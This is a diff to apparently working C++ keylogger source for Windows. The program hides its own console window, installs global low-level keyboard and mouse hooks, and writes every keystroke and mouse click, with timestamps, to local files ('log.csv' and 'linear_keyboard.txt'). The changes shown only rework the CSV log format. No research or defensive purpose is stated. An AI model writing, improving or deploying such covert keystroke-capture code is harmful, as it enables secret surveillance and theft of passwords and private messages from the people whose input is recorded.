@@ -19,12 +19,12 @@ int main()
 
     ShowWindow(GetConsoleWindow(), SW_HIDE);
     logFile.open("log.csv", std::ios::app);
-    logStream << "Time,Event,Type,Key/Position\n";
+    logStream << "Time,Event,Type,Key/Position,MousePosition\n";
     logFile << logStream.str();
     logFile.close();
 
     keyboardFile.open("linear_keyboard.txt", std::ios::app);
-    keyboardFile << "Every word typed by computer: \n";
+    keyboardFile << "Every word typed by computer:\n";
     keyboardFile.close();
 
     HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookProc, NULL, 0);
@@ -136,10 +136,13 @@ LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
             keyboardStream << key;
         }
 
+        char ptr = '0';
+
+        //logStream << "Time,Event,Type,Key/Position,MousePosition\n";
 
         logStream << std::put_time(&timeinfo, "%Y-%m-%d %H:%M:%S") << ","
-            << "Key,Pressed,"
-            << key << "\n";
+            << "Keyboard Key,Pressed,"
+            << key <<"," << ptr << "\n";
         logFile.open("log.csv", std::ios::app);
         logFile << logStream.str();
         logFile.close();
@@ -182,7 +185,10 @@ LRESULT CALLBACK mouseHookProc(int nCode, WPARAM wParam, LPARAM lParam)
         localtime_s(&localtime_buffer, &timestamp);
         char time_str[20];
         strftime(time_str, 20, "%Y-%m-%d %H:%M:%S", &localtime_buffer);
-        logStream << time_str << "," << time_now << ",Mouse," << button << "," << p.x << "," << p.y << "\n";
+
+        //logStream << "Time,Event,Type,Key/Position,MousePosition\n";
+        logStream << time_str << "," << "Mouse Click" << ",Mouse," << button << "," << p.x << ":" << p.y << "\n";
+
         logFile.open("log.csv", std::ios::app);
         logFile << logStream.str();
         logFile.close();
